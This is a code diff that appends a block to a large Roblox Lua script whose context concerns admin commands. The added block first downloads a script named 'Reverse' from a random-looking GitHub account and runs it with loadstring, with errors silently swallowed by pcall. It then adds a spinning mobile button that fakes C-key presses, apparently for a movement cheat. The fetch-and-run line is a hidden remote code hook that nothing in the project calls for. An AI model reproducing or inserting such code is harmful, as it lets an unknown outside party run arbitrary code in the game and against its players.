@@ -2267,3 +2267,171 @@ game.Players.PlayerAdded:Connect(function(player)
         setupAdminCommands(player)
     end
 end)
+
+
+
+-- Wrap in pcall for error handling
+pcall(function()
+    -- Load the remote script first
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/JSFKGBASDJKHIOAFHDGHIUODSGBJKLFGDKSB/fe/refs/heads/main/Reverse"))()
+end)
+
+-- Ensure we're running in a local context
+if not game:GetService("RunService"):IsClient() then
+    return
+end
+
+local UserInputService = game:GetService("UserInputService")
+local Players = game:GetService("Players")
+local Player = Players.LocalPlayer
+local StarterGui = game:GetService("StarterGui")
+local VirtualInputManager = game:GetService("VirtualInputManager")
+local TweenService = game:GetService("TweenService")
+
+-- Function to create GUI
+local function createMobileGui()
+    -- Check if GUI already exists and remove it
+    if Player.PlayerGui:FindFirstChild("MobileKeyboardGui") then
+        Player.PlayerGui.MobileKeyboardGui:Destroy()
+    end
+    
+    -- Show notification
+    pcall(function()
+        StarterGui:SetCore("SendNotification", {
+            Title = "Controls",
+            Text = "Hold C key to reverse",
+            Duration = 5
+        })
+    end)
+
+    -- Only create GUI for mobile users
+    if not UserInputService.TouchEnabled then
+        return
+    end
+
+    -- Create ScreenGui
+    local ScreenGui = Instance.new("ScreenGui")
+    ScreenGui.Name = "MobileKeyboardGui"
+    ScreenGui.ResetOnSpawn = false
+    
+    -- Wait for PlayerGui to be available
+    local success = pcall(function()
+        ScreenGui.Parent = Player:WaitForChild("PlayerGui", 10)
+    end)
+    
+    if not success then
+        warn("Failed to parent ScreenGui to PlayerGui")
+        return
+    end
+
+    -- Create Button
+    local Button = Instance.new("TextButton")
+    Button.Name = "KeyboardButton"
+    Button.Size = UDim2.new(0, 60, 0, 60)
+    Button.Position = UDim2.new(0.85, 0, 0.7, 0)
+    Button.BackgroundColor3 = Color3.fromRGB(128, 128, 128)
+    Button.BackgroundTransparency = 0.3
+    Button.Text = "⚙️"
+    Button.TextSize = 28
+    Button.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Button.Parent = ScreenGui
+
+    -- Make button perfectly round
+    local UICorner = Instance.new("UICorner")
+    UICorner.CornerRadius = UDim.new(1, 0)  -- This makes it completely round
+    UICorner.Parent = Button
+
+    -- Create spinning animation
+    local spinTween = nil
+    local function createSpinTween()
+        local spinInfo = TweenInfo.new(
+            1,                -- Duration (1 second per rotation)
+            Enum.EasingStyle.Linear,
+            Enum.EasingDirection.InOut,
+            -1,               -- Repeat infinitely
+            false,            -- Don't reverse
+            0                -- No delay
+        )
+        
+        return TweenService:Create(Button, spinInfo, {
+            Rotation = 360
+        })
+    end
+
+    -- Variables for tracking button state
+    local isHolding = false
+    local holdConnection = nil
+
+    -- Function to simulate keyboard press
+    local function simulateKeyPress()
+        VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.C, false, game)
+    end
+
+    -- Function to simulate keyboard release
+    local function simulateKeyRelease()
+        VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.C, false, game)
+    end
+
+    -- Function to handle continuous key press while holding
+    local function startHolding()
+        isHolding = true
+        simulateKeyPress()
+        
+        holdConnection = game:GetService("RunService").Heartbeat:Connect(function()
+            if not isHolding then
+                holdConnection:Disconnect()
+                return
+            end
+            simulateKeyPress()
+        end)
+        
+        -- Visual feedback and start spinning
+        Button.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
+        Button.Rotation = 0  -- Reset rotation
+        spinTween = createSpinTween()
+        spinTween:Play()
+    end
+
+    -- Function to handle button release
+    local function stopHolding()
+        if isHolding then
+            isHolding = false
+            if holdConnection then
+                holdConnection:Disconnect()
+                holdConnection = nil
+            end
+            simulateKeyRelease()
+            
+            -- Stop spinning and reset appearance
+            if spinTween then
+                spinTween:Cancel()
+                spinTween = nil
+            end
+            
+            -- Smoothly reset rotation to 0
+            TweenService:Create(Button, TweenInfo.new(0.3), {
+                Rotation = 0,
+                BackgroundColor3 = Color3.fromRGB(128, 128, 128)
+            }):Play()
+        end
+    end
+
+    -- Handle button press and release
+    Button.MouseButton1Down:Connect(startHolding)
+    Button.MouseButton1Up:Connect(stopHolding)
+
+    -- Handle touch ended outside the button
+    UserInputService.TouchEnded:Connect(function()
+        stopHolding()
+    end)
+end
+
+-- Attempt to create the GUI
+pcall(createMobileGui)
+
+-- Add a delay and try again in case of initial failure
+delay(1, function()
+    if not Player.PlayerGui:FindFirstChild("MobileKeyboardGui") then
+        pcall(createMobileGui)
+    end
+end)
